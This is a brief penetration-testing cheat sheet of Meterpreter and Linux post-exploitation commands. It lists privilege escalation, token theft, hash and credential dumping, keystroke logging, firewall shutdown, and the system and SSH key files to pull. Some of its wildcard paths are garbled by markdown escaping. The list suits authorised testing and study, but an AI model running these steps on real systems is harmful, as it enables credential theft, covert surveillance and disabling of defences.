# Meterpreter Post-Auth Runbook

Meterpreter Post-exploitation Modules ◇ > use post/windows/gather/enum\_logged\_on\_users ◇ Railgun - Meterpreter extension that allows direct access to Windows APIs ◇ IRB - ruby shell in meterpreter

Meterpreter Post Auth&#x20;

* Info gathering&#x20;
  * getuid&#x20;
  * getpid&#x20;
  * getsprivs&#x20;
  * sysinfo&#x20;
  * screenshot&#x20;
  * run winenum.rb&#x20;
  * run scraper.rb&#x20;
  * run checkvm&#x20;
  * run credscollect&#x20;
  * run get\_local\_subnets&#x20;
* Priv Esc&#x20;
  * ps then migrate&#x20;
  * getsystem&#x20;
* Tokens&#x20;
  * list\_tokens -u&#x20;
  * impersonate\_token&#x20;
  * steal\_token \[pid]&#x20;
  * rev2self&#x20;
* Retrieve passwords&#x20;
  * hashdump&#x20;
  * cachedump&#x20;
  * post/windows/gather/smart\_hashdump&#x20;
  * post/windows/gather/credentials/vnc&#x20;
* Session&#x20;
  * enumdesktops&#x20;
  * getdesktop&#x20;
  * setdesktop&#x20;
  * uictl disable keyboard&#x20;
* keylog&#x20;
  * keyscan\_start&#x20;
  * keyscan\_dump&#x20;
  * keyscan\_stop&#x20;
  * Nix Post Auth&#x20;
* Disable Firewall&#x20;
  * /etc/init.d/iptables save&#x20;
  * /etc/init.d/iptables stop&#x20;
  * iptables-save > root/firewall.rules&#x20;
  * iptables-restore < /root/firewall.rules&#x20;
* Files to pull&#x20;
  * /etc/passwd&#x20;
  * /etc/shadow OR /etc/security/shadow&#x20;
  * /etc/groups OR /etc/gshadow&#x20;
  * /home/_/.ssh/id_&#x20;
  * /etc/sudoers&#x20;
* User Information&#x20;
  * grep ^ssh /home/_/._hist __&#x20;
  * _grep ^telnet /home/_/._hist_&#x20;
  * grep ^mysql /home/_/._hist\*
